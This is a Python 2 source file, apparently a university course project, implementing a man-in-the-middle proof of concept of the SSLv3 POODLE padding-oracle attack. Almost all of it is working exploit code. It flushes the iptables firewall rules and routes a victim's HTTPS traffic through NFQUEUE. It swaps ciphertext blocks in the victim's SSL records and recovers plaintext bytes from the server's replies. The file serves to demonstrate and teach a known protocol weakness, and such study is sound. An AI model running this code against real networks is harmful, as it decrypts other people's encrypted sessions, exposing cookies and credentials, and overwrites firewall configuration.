# ================================================================================
#
# poodleMiM.py
#
# This is the Man-in-the-Middle server code written for my proof of concept program 
# to demonstrate the SSLv3 Padding Oracle On Downgraded Legacy Encryption 
# (POODLE) attack.
#
# Written in Python 2.7.7, requires  os, sys, re, nfqueue, socket, OptionParser, and select.
# Should work for any 2.x python
#
# Authors: Ryan Grandgenett
# For:    IASC 8410-001
# Date:   March 2015
#
# ================================================================================

# Imports 
import logging
l=logging.getLogger("scapy.runtime")
l.setLevel(49)
import os,sys,nfqueue,socket,time,re
import select
from optparse import OptionParser
from scapy.all import *
from SSLData import *
from Poodle import *
conf.verbose = 0
conf.L3socket = L3RawSocket

# Global poodle object	
poodle = None

# Global nfqueue object
q = None

#
# Initializes the global poodle object and system parameters required by the MiM server.
#
def initializePoodleExploit(client_ip, client_port, server_ip, block_size, message_url_data, message_post_data, target_block, end_block):
	global poodle		# Global poodle object
	
	# Create a new poodle object
	poodle = Poodle()
	
	# Print poodle MiM server welcome message
	poodle.welcomeMessage()

	# Assign the command line arguments to the poodle object
	poodle.client_ip = str(client_ip)
	poodle.client_port = int(client_port)
	poodle.server_ip = str(server_ip)
	poodle.block_size = int(block_size)
	poodle.message_url_data = str(message_url_data)
	poodle.message_post_data = str(message_post_data)
	poodle.target_block = int(target_block)
	poodle.end_block = int(end_block)
	
	# Set the Minimum payload size 
	if poodle.block_size == 8:
		poodle.min_payload_size = 24
	elif poodle.block_size == 16:
		poodle.min_payload_size = 32
	
	# Verify the client IP is property formatted
	if not re.match("^(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])$"	, poodle.client_ip):
		print "[-] Error the client IP address is not property formatted"
		os._exit(1)
		
	# Verify the server IP is property formatted	
	if not re.match("^(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])$"	, poodle.server_ip):
		print "[-] Error the client IP address is not property formatted "
		os._exit(1)
		
	# Set up the required IPTABLES rules
	os.system('iptables -F')
	os.system('iptables -A FORWARD -p tcp -s %s -d %s --dport 443 -j NFQUEUE' % (poodle.client_ip, poodle.server_ip))
	os.system('iptables -A FORWARD -p tcp -s %s -d %s --sport 443 -j NFQUEUE' % (poodle.server_ip, poodle.client_ip))
	
	# Set up the communication socket to the client
	poodle.client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	try:
		poodle.client_socket.connect((poodle.client_ip, poodle.client_port))
	except socket.error, (value,message): 
		if poodle.client_socket: 
			poodle.client_socket.close() 
		print "[-] Error could not open client socket: " + message 
		os._exit(1)
		
					
	# Capture the start time of the exploit
	poodle.exploit_stats.start_time = time.time()
	
#
# Sends the new url and post data to the client
#
def sendRequest(url_data, post_data):
	global poodle 	# Global poodle object
	global q		# Global nfqueue object
	
	# Re-import select this is a temporary workaround that will be fixed on a future date
	import select
	
	# Verify socket is ready to write data
	read_soc, write_soc, error_soc = select.select([], [poodle.client_socket], [], 300)
	
	# If socket is ready to write url and post data to client machine
	if write_soc[0]:
		try:
			# Send the url and post data
			poodle.client_socket.send(url_data + '$' + post_data + '\n')
		except socket.error, (value,message): 
			# Stop the Exploit
			if poodle.client_socket:
				poodle.client_socket.send('quit\n')
				poodle.client_socket.close()
				print "[-] Exiting ..."
				os.system('iptables -F')
				q.unbind(socket.AF_INET)
				q.close()
				os._exit(1)
			print "[-] Error writing to client socket: " + message
			
	
#
# Callback method used by the nfqueue try_run loop
#	
def process(i, payload):
	global poodle	# Global poodle object
	global q		# Global nfqueue object
	
	# Create a new SSLData data object to parse SSLv3 packets
	s = SSLData()
	
	# Get the payload data from the packet
	data = payload.get_data()
	
	# Create a new scapy object using the payload data
	pkt = IP(data)
	
	# If there is a full block of padding at the end of the client's ciphertext, run the exploit code
	if poodle.exploit_state == True:
		# If the packet is coming from the client to the server	
		if pkt[IP].src == poodle.client_ip:
			# If the packet is an SSL application data packet
			if s.isAppData(pkt):
				# Parse the packet into SSL records
				s.readInPacket(pkt, poodle.block_size)
				# Increment the total number decryption of attempts
				poodle.exploit_stats.total_attempt_count += 1
				# For each SSL record in the packet
				for record in s.records:
					# If the SSL record is the ciphertext payload record
					if record.contentType == 23 and record.length > poodle.min_payload_size:
						# Replace the last block of the ciphertext payload with the target block
						record.encData[-1] = record.encData[poodle.target_block]
						# Save the new modified ciphertext payload
						poodle.modifed_payload = record.encData
						# Pack the modified SSL records and set the new packet payload
						pkt[TCP].payload = s.packPacket()
						# Save the TCP session information 
						poodle.target_ssl_session.seq = pkt[IP].seq
						poodle.target_ssl_session.ack = pkt[IP].ack
						poodle.target_ssl_session.next_ack = pkt[IP].seq + len(pkt[TCP].payload)
						
						# Delete the packet checksum values (they will be recalculated by the kernel)		
						del pkt[IP].chksum
						del pkt[TCP].chksum
						
						# Accept and forward the modified packet
						payload.set_verdict_modified(nfqueue.NF_ACCEPT, str(pkt), len(pkt))
						
		# Else if the packet is coming from the sever to the client					
		elif pkt[IP].src == poodle.server_ip:
			# If this packet is the response from the sever decrypting the client's modified ciphertext payload
			if pkt[TCP].ack == poodle.target_ssl_session.next_ack:
				# If the packet is an SSL application data packet then we have decrypted a byte :)!
				if s.isAppData(pkt):
					# Calculate the decrypted plaintext byte
					plaintext_byte = chr( poodle.modifed_payload[-2][poodle.block_size - 1] ^ poodle.modifed_payload[poodle.target_block-1][poodle.block_size - 1] ^ (poodle.block_size - 1) )
					
					# Save the decrypted byte into the decrypted block variable 
					poodle.decrypted_block = plaintext_byte + poodle.decrypted_block 
					
					# If this is the first byte of the block that has been decrypted
					if poodle.decrypt_offset == 0:
						# Print the target block number
						print '[+] Target Block %d' % (poodle.target_block)
					
					# Print the decrypted byte information
					print '[+] Decrypted byte %d in %d attempts: 0x%02x(%s)' % ( (poodle.block_size - (poodle.decrypt_offset + 1) ) , (poodle.exploit_stats.total_attempt_count - poodle.exploit_stats.last_byte_attempt_count), ord(plaintext_byte), repr(plaintext_byte) )	

					# If this is the last byte of the block
					if poodle.decrypt_offset == (poodle.block_size - 1):						
						# If this is the last block to be decrypted
						if poodle.target_block == poodle.end_block:		
							# Append the decrypted block to the plaintext list
							poodle.plaintext.append(poodle.decrypted_block)
							
							# Generate the final plaintext
							final_plaintext = ''
							for block in poodle.plaintext:
								final_plaintext += ''.join(block)
								
							# Print attempt statistics
							print "[+] Decrypted %d bytes in %.2f seconds with an average of %.2f attempts per byte" % ( len(final_plaintext),(time.time() -poodle.exploit_stats.start_time), (poodle.exploit_stats.total_attempt_count/len(final_plaintext)) )
						
							# Print the final plaintext
							print "[+] Decrypted Plaintext: %s" % (repr(final_plaintext))
							
							# Stop the Exploit
							if poodle.client_socket:
								poodle.client_socket.send('quit\n')
								poodle.client_socket.close()
							print "[+] POODLE exploit finished successfully!"
							os.system('iptables -F')
							q.unbind(socket.AF_INET)
							q.close()
							os._exit(1)
						
						# Reset the decryption offset
						poodle.decrypt_offset = -1
						# Increase the target block number
						poodle.target_block += 1 
						# Append the decrypted block to the plaintext list
						poodle.plaintext.append(poodle.decrypted_block)
						# Reset the decrypted block information
						poodle.decrypted_block = ''

					# Save the attempt information
					poodle.exploit_stats.last_byte_attempt_count = poodle.exploit_stats.total_attempt_count
					
					# Increase the decrypt offset value
					poodle.decrypt_offset += 1
					
					# Send request to decrypt next byte
					sendRequest(poodle.message_url_data + 'U' * poodle.decrypt_offset, poodle.message_post_data[poodle.decrypt_offset:])
					
				# Else if the packet is an SSL application error packet then decryption failed and we need to send another request 
				elif s.isAlert(pkt):
					sendRequest(poodle.message_url_data + 'U' * poodle.decrypt_offset, poodle.message_post_data[poodle.decrypt_offset:])

	# Else make request until a new block (of all padding) is added to client's ciphertext
	else:
		# Packet is coming from the client to the server	
		if pkt[IP].src == poodle.client_ip:
			# If the packet is an SSL application data packet
			if s.isAppData(pkt):
				# Parse the packet into SSL records
				s.readInPacket(pkt, poodle.block_size)
				# For each SSL record in the packet
				for record in s.records:
					# If the SSL record is the ciphertext payload record
					if record.contentType == 23 and record.length > poodle.min_payload_size:
						# If the poodle.original_length value is zero, then initialize it
						if poodle.original_length == 0:
							poodle.original_length = record.length
							print '[+] Original length of ciphertext (Bytes): %d ' % (poodle.original_length)
						# Else check if a new block has been added to the payload
						else:
							if record.length - poodle.original_length > 0:
								# Save the altered ciphertext length
								poodle.altered_length = record.length
								# Put the program into exploit state 
								poodle.exploit_state = True
								# Print block information
								print '[+] New block found!'
								print '[+] New length of ciphertext (Bytes): %d ' % (poodle.altered_length)
								# Send next request
								sendRequest(poodle.message_url_data, poodle.message_post_data)
				
				# If a new block has not been found add another byte to the request (should take at most 8 attempts for SSLv3)
				if poodle.exploit_state == False:
					poodle.message_url_data += 'A'
					sendRequest(poodle.message_url_data, poodle.message_post_data)
				
	# Accept and forward the packet
	payload.set_verdict(nfqueue.NF_ACCEPT)

#
# Program main function called on program start
#	
def main():
	global poodle	# Global poodle object
	global q		# Global nfqueue object
	
	# Parse the command line arguments
	parser = OptionParser(epilog="Report bugs to rmgrandgenett@unomaha.edu", description="Man-in-the-Middle proof of concept program to demonstrate the SSLv3 Padding Oracle On Downgraded Legacy Encryption.", version="0.1")
	parser.add_option('-v', help='ip address of victim', action='store', dest='client_ip')
	parser.add_option('-p', help='port of remote https request program on the victim\'s machine', action='store', dest='client_port')
	parser.add_option('-s', help='ip address of server', action='store', dest='server_ip')
	parser.add_option('-b', help='algorithm block size in bytes', action='store', dest='block_size')
	parser.add_option('-u', help='url data value (must match client https request program)', action='store', dest='message_url_data')
	parser.add_option('-d', help='post request data value (must match client https request program)', action='store', dest='message_post_data')
	parser.add_option('-t', help='block number to start decryption', action='store', dest='target_block')
	parser.add_option('-e', help='block number to end decryption', action='store', dest='end_block')
	
	# Verify the required command line arguments are present
	(options, args) = parser.parse_args(sys.argv)
	if not options.client_ip or not options.client_port or not options.server_ip or not options.block_size or not options.message_url_data or not options.message_post_data or not options.target_block or not options.end_block:
		print '\n[-] -v, -p, -s, -b, -u, -d, -t, and -e are required. Please use the -h flag for help.'
		sys.exit(1)
	
	# Initialize poodle object	
	initializePoodleExploit(options.client_ip, options.client_port, options.server_ip, options.block_size, options.message_url_data, options.message_post_data,options.target_block, options.end_block) 
	
	# Initialize nfqueue object	
	q = nfqueue.queue()
	# Open the queue
	q.open()
	# Bind the queue to the socket.AF_INET structure
	q.bind(socket.AF_INET)
	# Set the callback function
	q.set_callback(process)
	# Bind to queue zero
	q.create_queue(0)
	try:
		# Start the loop
		q.try_run()
	# Catch the SIGINT signal and exit the program
	except KeyboardInterrupt:
		if poodle.client_socket:
			poodle.client_socket.close()
		print "Exiting..."
		os.system('iptables -F')
		q.unbind(socket.AF_INET)
		q.close()
		# Save the poodle object
		sys.exit(1)

# Hook	
if __name__ == "__main__":
	main()